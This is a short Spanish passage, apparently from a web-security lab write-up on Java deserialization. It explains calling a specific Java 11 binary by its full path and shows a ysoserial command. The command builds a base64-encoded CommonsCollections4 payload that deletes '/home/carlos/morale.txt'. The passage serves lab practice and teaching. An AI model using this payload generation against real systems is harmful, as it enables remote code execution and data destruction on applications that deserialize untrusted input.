...
De `forma alternativa`, si no queremos `cambiar` la `versión` de `java` por `defecto` del `sistema` con `update-alternatives`, podemos `invocar directamente` el `binario` de la `versión` que nos `interesa` indicando su `ruta completa`. Así el `java global` sigue `intacto` y no `afectamos` a otras `herramientas` que `dependan` de una `versión distinta` como por ejemplo `Burpsuite`. El `comando` quedaría así

```
# /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```
